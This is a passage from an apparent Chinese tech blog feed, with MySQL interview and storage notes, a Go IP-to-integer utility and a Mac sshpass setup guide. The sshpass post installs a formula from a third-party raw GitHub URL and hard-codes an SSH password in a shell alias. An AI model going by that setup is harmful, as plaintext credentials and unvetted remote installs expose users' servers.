非常快，多以B树的效率取决于磁盘访问次数。关键字总数相同的情况下B树的高度越小，磁盘I/O所花时间越少。</li><li>所有叶子节点位于同一层。</li></ul></li><li><p>B+树</p><ul><li>B树的变形树，非叶子节点只保存索引，不保存实际的数据，数据都保存在叶子节点中，且有序。</li><li>B树不允许关键字重复,B+树允许重复。</li><li>所有叶子节点都有指向下一个叶子节点的指针。</li></ul></li><li><h5 id="那么为什么是B-树？"><a href="#那么为什么是B-树？" class="headerlink" title="那么为什么是B+树？"></a>那么为什么是B+树？</h5><ul><li><p>磁盘读写代价更低：内部节点只有指向下层节点的页指针（6个字节），因此内部节点相对B树更小，一页空间能容纳的关键字数量更多，I/O次数也就更少。</p></li><li><p>查询效率更稳定：任何关键字的查找必须走一条从根结点到叶子结点的路，所以每一个数据的查询效率相当。</p></li><li><p>利于数据库的扫描：B+树只需要遍历叶子节点就可以实现对全部关键字的扫描，更有利于范围查询。B树如果需要扫描，需要进行一次中序遍历，效率太低。</p></li></ul></li><li><h5 id="InnoDB的B-树索引"><a href="#InnoDB的B-树索引" class="headerlink" title="InnoDB的B+树索引"></a>InnoDB的B+树索引</h5><ul><li>每当某个表创建B+树索引的时候，都会为这个索引创建一个根节点页面。开始没有数据的时候，根节点中既没有用户记录，也没有目录项记录。</li><li>根节点中可用空间用完后再继续插入记录，会将根节点中的记录复制到一个新分配的页总，然后对新页进行页分裂。新插入的记录根据索引值大小分配到分裂的页中，根节点升级为存储目录项记录的页。</li><li>B+树索引的根节点从创建开始，便不会再移动。InnoDB用到这个索引的时候，会从固定的地方取出根节点的页号，从而访问这个索引。</li></ul></li></ol><h3 id="说说什么是最左匹配，对组合索引的理解"><a href="#说说什么是最左匹配，对组合索引的理解" class="headerlink" title="说说什么是最左匹配，对组合索引的理解"></a>说说什么是最左匹配，对组合索引的理解</h3><p>两个或更多个列上的索引被称作联合索引，联合索引又叫复合索引。</p><ul><li><p>建立联合索引时，从左到右依次判断，如果左边列相同，则根据第二列的大小排列，多列以此类推。</p></li><li><p>想要找”二班的小Q“，因为不知道年级，所以需要遍历所有数据。</p></li><li><p>年级&gt;=三 and 年级&lt;=四 and 名字=小Q，因为不知道是几班的，所以要把三、四年级都遍历一遍，但是也用到了年级这个索引列，不用找其他年级。</p></li><li><p>如果期望order by的子句使用索引，后面的顺序也必须按照索引列的顺序给出。如：按照年级、班级、名字顺次取10位同学。</p><p><img src="https://img-blog.csdnimg.cn/20200419175555700.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul><h3 id="有没有遇到过慢查询，如何优化？"><a href="#有没有遇到过慢查询，如何优化？" class="headerlink" title="有没有遇到过慢查询，如何优化？"></a>有没有遇到过慢查询，如何优化？</h3><p>要是说没遇到过，面试官也不会以为你SQL学的好，他一定认为”渣渣，连慢查询都没写过🐶🐶🐶“。</p><h6 id="怎么更容易的写出慢查询？"><a href="#怎么更容易的写出慢查询？" class="headerlink" title="怎么更容易的写出慢查询？"></a>怎么更容易的写出慢查询？</h6><ul><li>建表随便一点，能达到事半功倍的效果。</li><li>建表不建索引，或者建了索引但是没有用上。</li><li>隐式类型转换。</li><li>select * where xxx=xxx 不管是啥，先查出来再说。</li><li>select xxx limit 100000 符合条件的数据有多少，全部拿出来，用不用再说。</li><li>join 各种表，连接一万遍。</li><li>为了展现强大的SQL水平，一条SQL要写一页，谁都别想看懂。</li><li>花样 like。</li><li>可能还有更高深的方法。。。</li></ul><h6 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h6><p>要想优化，得先定位问题，explain或desc查看SQL是怎么执行的。👀👀👀<a href="https://blog.csdn.net/liyuxing6639801/article/details/105646853">explain用法和结果的含义</a></p><ul><li><p>索引</p><blockquote><ol><li>合理利用覆盖索引。</li><li>索引中的字段数建议不超过5个。</li><li>单张表的索引数量控制在5个以内。</li><li>对长度过长的VARCHAR字段建立索引时，添加crc32或者MD5 Hash字段，对Hash字段建立索引。</li><li>短索引。</li></ol></blockquote></li><li><p>SQL</p><blockquote><ol><li>SQL语句中IN包含的值不应过多，否则即使有索引还是可能扫全表。</li><li>如果使用了IN或者OR等时发现查询没有走索引，使用显示申明指定索引（不建议）。</li><li>WHERE条件中必须使用合适的类型，避免MySQL进行隐式类型转化。</li><li>SELECT语句只获取需要的字段。</li><li>避免在SQL语句进行数学运算或者函数运算，否则不走索引。</li><li>避免使用JOIN。</li><li>统计表中记录数时使用COUNT(*)，而不是COUNT(primary_key)和COUNT(1)。但是COUNT(*)也可以用Redis等其他方式代替。</li><li>WHERE条件中的非等值条件（IN、BETWEEN、&lt;、&lt;=、&gt;、&gt;=）会导致后面的条件使用不了索引。</li><li>复杂SQL拆分。</li><li>使用合理的分页方式以提高分页的效率。</li></ol></blockquote></li><li><p>建表</p><blockquote><ol><li><p>每一列都是not null：如果某一列可能存储null值，那么mysql需要额外维护一个==null值列表==，存储上，查询上都增加了成本。</p></li><li><p>能用固定长度数据类型解决的，不用变长类型。</p></li></ol></blockquote></li><li><p>表维护</p><blockquote><p>定期将历史数据存档，表内数据维持在一定数量范围。</p><p>使用hash等方式分表。</p></blockquote></li><li><p>碎片整理</p><blockquote><p><a href="https://blog.csdn.net/liyuxing6639801/article/details/105646967">碎片整理遇到的那些事</a></p></blockquote></li></ul><h3 id="Mysql有哪几种事物隔离级别及区别？"><a href="#Mysql有哪几种事物隔离级别及区别？" class="headerlink" title="Mysql有哪几种事物隔离级别及区别？"></a>Mysql有哪几种事物隔离级别及区别？</h3><ul><li><h5 id="事务基本要素"><a href="#事务基本要素" class="headerlink" title="事务基本要素"></a>事务基本要素</h5><ol><li>原子性<strong>Atomicity</strong></li><li>一致性<strong>Consistency</strong></li><li>隔离性<strong>Isolation</strong></li><li>持久性<strong>Durability</strong></li></ol></li><li><h5 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a>事务隔离级别</h5><p>默认隔离级别：repeatable-read 可重复读。</p><p>事务隔离级别为串行化时，读写数据都会锁住整张表。</p><p>事务隔离级别为可重复读时，如果检索条件有索引（包括主键索引）的时候，默认加锁方式是next-key 锁；如果检索条件没有索引，更新数据时会锁住整张表。</p><p>事务隔离级别为读提交时，写数据只会锁住相应的行。</p><table><thead><tr><th>隔离级别</th><th>脏读</th><th>不可重复读</th><th>幻读</th></tr></thead><tbody><tr><td>读未提交read-uncommitted</td><td>是</td><td>是</td><td>是</td></tr><tr><td>不可重复读read-committed</td><td>否</td><td>是</td><td>是</td></tr><tr><td>可重复读repeatable-read</td><td>否</td><td>否</td><td>是</td></tr><tr><td>串行化serializable</td><td>否</td><td>否</td><td>否</td></tr></tbody></table></li><li><h5 id="不可重复读和幻读"><a href="#不可重复读和幻读" class="headerlink" title="不可重复读和幻读"></a>不可重复读和幻读</h5><p>不可重复读重点在于update</p><p>幻读的重点在于insert</p></li></ul><h3 id="Mysql中的锁"><a href="#Mysql中的锁" class="headerlink" title="Mysql中的锁"></a>Mysql中的锁</h3><ul><li>锁结构</li></ul><p><img src="https://img-blog.csdnimg.cn/20200419175424893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_14,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p>MySQL中的行锁和表锁</p><ol><li>行锁是InnoDB引擎才有的。MyISAM、Memory、Merge等引擎都只支持表锁，并且不支持事务。</li><li>表锁实现简单，占用资源少，但是粒度大，性能较差。</li><li>对某个表执行一些诸如<code>ALTER TABLE</code>、<code>DROP TABLE</code>这类的<code>DDL</code>语句时，其他事务对这个表并发执行诸如<code>SELECT</code>、<code>INSERT</code>、<code>DELETE</code>、<code>UPDATE</code>的语句会发生阻塞，反之也会发生阻塞。这个过程通过在server层使用==元数据锁==（MDL）实现。</li></ol></li><li><p>一致性读</p><p>事务利用MVCC进行读取操作，称为一致性读、快照读或一致性无锁读。一致性读不会对表中记录进行加锁，其他事务可以自由对表中记录进行改动。</p></li><li><p>行级锁</p><ol><li><p>共享锁</p><p>Share Locks，简称S锁。事务在读取一条记录时，需要先获取S锁。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ... lock in share mode;</span><br></pre></td></tr></tbody></table></figure></li><li><p>独占锁</p><p>也叫排它锁，Exclusive Locks，简称X锁。事务要改动一条记录时，需要先获取该记录的X锁。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select ... for update;</span><br></pre></td></tr></tbody></table></figure></li><li><p>行级锁兼容性</p><table><thead><tr><th>兼容性</th><th>X</th><th>S</th></tr></thead><tbody><tr><td>X</td><td>No</td><td>No</td></tr><tr><td>S</td><td>No</td><td>Yes</td></tr></tbody></table></li></ol></li><li><p>表级锁</p><ol><li><p>表级共享锁</p></li><li><p>表级独占锁</p></li><li><p>意向共享锁（IS锁）</p><p>给表上锁前需要知道表中有没有行锁，遍历又不是MySQL的风格，于是提出了意向锁。也就是在给某条记录加S锁时，需要先加一个表级别的IX锁。</p></li><li><p>意向独占锁（IX锁)</p><p>同理</p></li><li><p>表级锁兼容性</p><p>意向锁只是为了快速判断，意向锁之间都是兼容的。</p><table><thead><tr><th align="center">兼容性</th><th align="center">X</th><th align="center">S</th><th align="center">IX</th><th align="center">IS</th></tr></thead><tbody><tr><td align="center">X</td><td align="center">No</td><td align="center">No</td><td align="center">No</td><td align="center">No</td></tr><tr><td align="center">S</td><td align="center">No</td><td align="center">Yes</td><td align="center">No</td><td align="center">Yes</td></tr></tbody></table></li></ol><p>  |   IX   |  No  |  No  | Yes  | Yes  |<br>   |   IS   |  No  | Yes  | Yes  | Yes  |</p></li><li><h5 id="表级别AUTO-INC锁"><a href="#表级别AUTO-INC锁" class="headerlink" title="表级别AUTO-INC锁"></a>表级别AUTO-INC锁</h5><p>主键通常添加==AUTO_INCREMENT==属性，系统实现自增的原理有两个：</p><blockquote><ol><li><p>执行插入操作时，在表级别加一个==AUTO-INC==锁，然后为每条记录分配递增值，该语句结束后再释放AUTO-INC锁，这样可以保证递增值是连续的。</p><p>AUTO_INC锁的作用范围只是insert语句，insert语句执行完就被释放了，不用等到事务结束。</p></li><li><p>采用轻量级的锁，在为insert语句生成递增值的时候获取一下轻量级锁，获取到后即可释放，不用等insert语句执行完毕再释放。</p></li><li><p>InnoDB提供一个<code>innodb_autoinc_lock_mode</code>系统变量，值为0时，一律采用AUTO-INC锁；值为2时，一律采用轻量级锁（不安全）；值为1时，在插入记录数量确定时采用轻量级锁，不确定时使用AUTO-INC锁。</p></li></ol></blockquote></li><li><p>行锁的具体类型</p><ul><li><p>普通行锁</p></li><li><p>间隙锁</p><p>官方名为LOCK_GAP，简称gap锁，仅仅是为了==防止插入幻影记录==而提出的。获取间隙锁后，其他事务不能在当前记录和相邻前一条记录的间隙中插入新记录。</p><p>MySQL在可重复读隔离级别下是可以解决幻读问题的：</p><ol><li>MVCC</li><li>加锁，加锁方案解决时，由于第一次执行读取操作时，幻影记录尚不存在，所以无法给其加锁。因此提出间隙锁。</li></ol></li><li><p>Next-Key Lock</p><p>官方名为LOCK_ORDINARY。既想锁住某条记录，又想阻止其他事务在该记录前面间隙插入新纪录。</p></li><li><p>插入意向锁</p><p>在插入数据时发现存在间隙锁，需要进行等待。在等待的时候需要在内存中生成插入意向锁。插入意向锁并不会阻止别的事务继续获取该记录上任何类型的锁（要它有啥用）。</p></li></ul></li></ul><h3 id="Mysql主从是怎么同步的？"><a href="#Mysql主从是怎么同步的？" class="headerlink" title="Mysql主从是怎么同步的？"></a>Mysql主从是怎么同步的？</h3><p>MySQL服务器之间的主从同步是基于二进制日志机制，主服务器使用二进制日志来记录数据库的变动情况，从服务器通过读取和执行（两个线程）该日志文件保持与主服务器的数据一致。</p><ul><li><p>主从同步的好处</p><ol><li>读写分离。</li><li>数据备份。</li><li>故障切换。</li><li>主服务器生成实时数据，从服务器分析，提高主服务器性能。</li></ol></li><li><p>同步方法</p><ol><li><p>Statement Based Replication 基于SQL语句的复制，主服务器将SQL写到日志文件中</p><p>优点：日志文件小；记录了所有语句，方便审计。</p><p>缺点：sql中的函数语句不能正确复制；告警信息不能正确复制；</p></li><li><p>Row Based Replication 基于行的复制，行变化作为事件写入二进制日志。</p><p>优点：最安全的复制方式；更少的行级锁</p><p>缺点：日志文件大；不能进行日志审计</p></li><li><p>Mixed Based Replication 混合，既使用SBR又使用RBR，默认SBR。</p></li></ol></li></ul><h3 id="MySQL主从同步延迟问题"><a href="#MySQL主从同步延迟问题" class="headerlink" title="MySQL主从同步延迟问题"></a>MySQL主从同步延迟问题</h3><ol><li>高延迟——高并发场景下从库的数据会比主库慢，从而导致延迟。出现写入主库成功，但是数据需要等待几十毫秒或者更长时间才能读到。</li><li>丢数据——master节点突然挂掉，但是新写的数据还没有同步到slave节点，导致数据丢失。</li></ol><blockquote><p>主库和从库执行相同的SQL，主库可以快速执行，为什么从库不行？</p><p>master可以并发，但是slave的SQL线程只能顺序执行。当TPS较高时，产生的SQL超过slave一个SQL线程能承受的范围，延时就产生了。</p></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show status # Seconds_Behind_Master查看从库落后多长时间</span><br></pre></td></tr></tbody></table></figure><ul><li><p>MySQL主从同步解决方案</p><ol><li><p>半同步复制——解决数据丢失问题，但会增加延迟。</p><p>默认是异步复制的方式，master并不关心slave数据有没有写入成功。</p><p>从库写入relay_log成功才返回ack消息，然后才返回客户端。</p><p><img src="https://img-blog.csdnimg.cn/20200419175312840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_left" alt="在这里插入图片描述"></p></li><li><p>多库并行复制——解决从库复制延迟问题</p><p>多启了几个线程</p></li></ol></li><li><h5 id="常见主从延迟原因及解决方案"><a href="#常见主从延迟原因及解决方案" class="headerlink" title="常见主从延迟原因及解决方案"></a>常见主从延迟原因及解决方案</h5><ol><li>SQL执行速度慢：优化索引</li><li>批量DML：通过缓存等方式降低DB并发压力</li><li>大事务，耗时长：事务拆解，移除不必要事务</li></ol></li></ul><h3 id="MySQL中varchar与char的区别以及char-10-中的10代表的涵义？"><a href="#MySQL中varchar与char的区别以及char-10-中的10代表的涵义？" class="headerlink" title="MySQL中varchar与char的区别以及char(10)中的10代表的涵义？"></a>MySQL中varchar与char的区别以及char(10)中的10代表的涵义？</h3><ul><li>从字面上看varchar是变长，char是定长，实际是这样吗？如果使用utf8进行编码有什么不同？</li><li>在utf8下char(10)代表最小可以存储10字节的字符，最大可以存储30字节的字符。也就意味着变长长度列表中会记录char数据类型的长度。</li><li>在多字节字符集（如：utf8)的情况下，char和varchar的实际存储都是变长字符类型。</li><li>char(10)最小存储10个字节，如果不足用0x20（空格）补足，因此在InnoDB utf8编码集下更推荐使用varchar。</li></ul><p>持续更新…</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac-安装sshpass</title>
      <link href="/uncatesgorized/2021-03-07-Mac-%E5%AE%89%E8%A3%85sshpass/"/>
      <url>/uncatesgorized/2021-03-07-Mac-%E5%AE%89%E8%A3%85sshpass/</url>
      
        <content type="html"><![CDATA[<p>网上好多都失效了，2019-11-20以下方法亲测可行。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb</span><br></pre></td></tr></tbody></table></figure><p>安装成功后执行 sshpass出现以下效果，说明安装成功。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sshpass</span><br><span class="line">Usage: sshpass [-f|-d|-p|-e] [-hV] command parameters</span><br><span class="line">   -f filename   Take password to use from file</span><br><span class="line">   -d number     Use number as file descriptor for getting password</span><br><span class="line">   -p password   Provide password as argument (security unwise)</span><br><span class="line">   -e            Password is passed as env-var "SSHPASS"</span><br><span class="line">   With no parameters - password will be taken from stdin</span><br><span class="line"></span><br><span class="line">   -P prompt     Which string should sshpass search for to detect a password prompt</span><br><span class="line">   -v            Be verbose about what you're doing</span><br><span class="line">   -h            Show help (this screen)</span><br><span class="line">   -V            Print version information</span><br><span class="line">At most one of -f, -d, -p or -e should be used</span><br></pre></td></tr></tbody></table></figure><p>安装成功了，那就把密码记下来吧</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.bashrc</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alias jump="sshpass -p '666' ssh host"</span><br></pre></td></tr></tbody></table></figure><p>载入文件 source ~/.bashrc, 具体是哪个文件根据自身情况决定，我把.bashrc 加在了.zshrc里，所以我执行的是<code>source ~/.zshrc</code>。</p><p>接下来就是验证成果是时候了。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ jump</span><br><span class="line">Last login: Wed Nov 20 21:59:08 2019 from 172.16.113.151</span><br><span class="line">Welcome to Alibaba Cloud Elastic Compute Service !</span><br></pre></td></tr></tbody></table></figure><h2 id="Success"><a href="#Success" class="headerlink" title="Success"></a>Success</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Mac </tag>
            
            <tag> sshpass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂-ip转int，int转ip</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-ip%E8%BD%ACint%EF%BC%8Cint%E8%BD%ACip/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-%E6%9D%82-ip%E8%BD%ACint%EF%BC%8Cint%E8%BD%ACip/</url>
      
        <content type="html"><![CDATA[<h4 id="IP和int之间相互转换"><a href="#IP和int之间相互转换" class="headerlink" title="IP和int之间相互转换"></a>IP和int之间相互转换</h4><figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">toInt</span><span class="params">(ip <span class="type">string</span>)</span></span> <span class="type">int64</span> {</span><br><span class="line">i := <span class="number">3</span></span><br><span class="line">sum := <span class="type">int64</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> j, v := <span class="keyword">range</span> strings.Split(ip, <span class="string">"."</span>) {</span><br><span class="line">intV, _ := strconv.ParseInt(v, <span class="number">10</span>, <span class="number">64</span>)</span><br><span class="line">sum = sum + intV*<span class="type">int64</span>(math.Pow(<span class="type">float64</span>(<span class="number">256</span>), <span class="type">float64</span>(i-j)))</span><br><span class="line">}</span><br><span class="line">fmt.Println(sum)</span><br><span class="line"><span class="keyword">return</span> sum</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">toIp</span><span class="params">(num <span class="type">int64</span>)</span></span> <span class="type">string</span> {</span><br><span class="line">s := <span class="built_in">make</span>([]<span class="type">string</span>, <span class="number">4</span>)</span><br><span class="line">i := <span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> i &gt;= <span class="number">0</span> {</span><br><span class="line">s[i] = strconv.FormatInt(num % <span class="number">256</span>,<span class="number">10</span>)</span><br><span class="line">num /= <span class="number">256</span></span><br><span class="line">i--</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> strings.Join(s, <span class="string">"."</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> IP </tag>
            
            <tag> Utils </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-表</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%A1%A8/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="主键三连"><a href="#主键三连" class="headerlink" title="主键三连"></a>主键三连</h3><ul><li>显示定义主键。</li><li>如果没有显示指定，查找表中唯一索引，如果有，该列为主键。</li><li>不符合上面两条，InnoDB自动创建一个6字节大小的指针。</li></ul><h3 id="逻辑存储结构"><a href="#逻辑存储结构" class="headerlink" title="逻辑存储结构"></a>逻辑存储结构</h3><ul><li>表空间-&gt;段-&gt;区-&gt;页</li></ul><p><img src="https://img-blog.csdnimg.cn/20200504134054591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ul><li><p>表空间</p><p>每张表的表空间存放的只是数据、索引、插入缓冲。其他类型的数据，如undo信息，系统事务信息，二次写缓冲等还是存放在共享表空间中。</p></li><li><p>段</p><p>每个段开始时，先用32个页大小的碎片页来存放数据，用完后在用区（64个连续页）</p><ol><li>数据段 B+数的叶子节点</li><li>索引段 B+数的非叶子节点</li><li>回滚段</li></ol></li><li><p>区</p><p>由64个连续的页组成，每个页16KB，每个区1MB。</p><p>InnoDB每次最多可以申请4个区，以此保证数据的顺序性能。</p></li><li><p>页</p><p>每个页至少2行，最多7992行</p><ol><li>数据页(B-tree Node)</li><li>undo页</li><li>系统页</li><li>事务数据页</li><li>插入缓冲位图页</li><li>插入缓冲空闲列表页</li><li>未压缩的二进制大对象(BLOB)页</li><li>压缩的二进制大对象页</li></ol></li><li><p>行</p><p>每个页存放16KB/2~200行记录，即7992行。</p></li></ul><h3 id="物理存储结构"><a href="#物理存储结构" class="headerlink" title="物理存储结构"></a>物理存储结构</h3><ol><li>共享表空间</li><li>Redo文件组</li><li>表结构定义文件</li><li>独立表空间（需要设置才有）</li></ol><h3 id="InnoDB行记录格式"><a href="#InnoDB行记录格式" class="headerlink" title="InnoDB行记录格式"></a>InnoDB行记录格式</h3><ul><li>Compact行格式</li></ul><p><img src="https://img-blog.csdnimg.cn/20200504134112330.png#pic_center" alt="在这里插入图片描述"></p><ul><li><p>变长字段</p><p>逆序放置</p><p>列长小于255，用一个字节；大于255，用两个字节；最大不能超过2个字节。所以varchar最大长度是65535。</p></li><li><p>NULL标志（至少一个字节）</p><p>逆序放置</p></li><li><p>记录头信息</p><p>固定占用5字节</p></li><li><p>隐藏列——事务ID和回滚指针列</p></li><li><p>RowID列（6字节）</p></li><li><p>行溢出数据</p><p>InnoDB存储引擎可以将一条记录中的某些数据存储在真正的数据页之外，即作为行溢出数据。</p></li><li><p>Char的行结构存储</p><p>在多字节字符型的存储中，char被视为变长类型，未能占满长度的字符用0x20填充。可以说在多字节字符集的情况下，char和varchar的行存储基本没有区别。</p></li></ul><h3 id="InnoDB数据页结构"><a href="#InnoDB数据页结构" class="headerlink" title="InnoDB数据页结构"></a>InnoDB数据页结构</h3><p>InnoDB数据页由7个部分组成：</p><ol><li><p>文件头 file header</p><p>大小固定 8个部分，共38个字节</p><blockquote><p>属于哪个表空间</p><p>上一页、下一页（叶子节点双向链表）</p><p>页类型（叶子节点、索引节点、undo log页···）</p><p>等···</p></blockquote></li><li><p>页头 page header</p><p>大小固定 14个部分，共56个字节</p><blockquote><p>记录数量</p><p>空闲链表首指针</p><p>堆中第一条记录的指针</p><p>属于哪个索引ID</p><p>等···</p></blockquote></li><li><p>Infimun + supermum records</p><p>每页中有两个虚拟行记录，用来限定记录的边界。</p><p>Infimun 最小值</p><p>supermum 最大值</p></li></ol><p>  <img src="https://img-blog.csdnimg.cn/20200504134129918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><ol start="4"><li><p>用户记录(行记录) user records</p></li><li><p>空闲空间 free space</p><p>链表数据结构，有记录被删除后，会被加入到空闲链表中。</p></li><li><p>页目录 page directory</p><p>存放记录的相对位置</p><p>B+数索引只能找到记录所在的页，数据库把页载入内存，然后通过page directory进行二分查找。二分查找的时间复杂度很低，通常忽略这部分时间。</p></li><li><p>文件尾信息 file tailer</p><p>页的完整性保证</p><p>大小固定 1个部分，共8个字节</p></li></ol><h3 id="约束"><a href="#约束" class="headerlink" title="约束"></a>约束</h3><ul><li><p>数据完整性</p><p>实体完整性</p><p>域完整性</p><p>参照完整性</p></li><li><p>四种约束</p><p>主键</p><p>唯一键</p><p>外键</p><p>default</p><p>not null</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-锁</title>
      <link href="/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%94%81/"/>
      <url>/%E6%95%B0%E6%8D%AE%E5%BA%93/2021-03-07-Mysql-%E9%94%81/</url>
      
        <content type="html"><![CDATA[<h3 id="MySQL-锁"><a href="#MySQL-锁" class="headerlink" title="MySQL 锁"></a>MySQL 锁</h3><ul><li><h4 id="thanks"><a href="#thanks" class="headerlink" title="thanks :"></a>thanks :</h4></li></ul><ol><li><a href="https://blog.csdn.net/claram/article/details/54023216">zhiboer</a></li><li><a href="https://blog.csdn.net/puhaiyang/article/details/72284702">静下心来静下心来</a></li></ol><ul><li><h4 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h4></li></ul><blockquote><ul><li>没有线程对该结果集中的任何行数据使用排他锁或共享锁，否则申请会阻塞。</li><li>for update仅适用于InnoDB，且必须在事务块(BEGIN/COMMIT)中才能生效</li><li>MySQL会对查询结果集中每行数据都添加排他锁，其他线程对该记录的更新与删除操作都会阻塞。</li><li>排他锁包含行锁、表锁。</li></ul></blockquote><ul><li><h4 id="数据一致性"><a href="#数据一致性" class="headerlink" title="数据一致性"></a>数据一致性</h4></li><li><p>悲观锁</p><blockquote><ul><li>共享锁<blockquote><p>共享锁指的就是对于多个不同的事务，对同一个资源共享同一个锁。<br>关键字：==lock in share mode==</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">begin;</span><br><span class="line"> SELECT * from city where id = "1"  lock in share mode;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></blockquote></li><li>排他锁<blockquote><p>多个不同的事务，对同一个资源只能有一把锁。<br>关键字：==for update==</p><ul><li>每次获取商品时，对该商品加排他锁。</li><li>期间其他用户阻塞等待访问该记录。</li><li>悲观锁适合写入频繁的场景。</li></ul></blockquote></li></ul></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">begin;</span><br><span class="line">    select * from goods where id = 1 for update;</span><br><span class="line">    update goods set stock = stock - 1 where id = 1;</span><br><span class="line">commit;</span><br></pre></td></tr></tbody></table></figure></li><li><p>乐观锁</p><blockquote><blockquote><ul><li>每次获取商品时，不对该商品加锁。</li><li>在更新数据的时候需要比较程序中的库存量与数据库中的库存量是否相等，如果相等则进行更新，反之程序重新获取库存量，再次进行比较，直到两个库存量的数值相等才进行数据更新。</li><li>乐观锁适合读取频繁的场景。</li></ul></blockquote></blockquote><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#不加锁获取 id=1 的商品对象</span><br><span class="line">select * from goods where id = 1</span><br><span class="line"></span><br><span class="line">begin;</span><br><span class="line">    #更新 stock 值，这里需要注意 where 条件 “stock = cur_stock”，只有程序中获取到的库存量与数据库中的库存量相等才执行更新</span><br><span class="line">    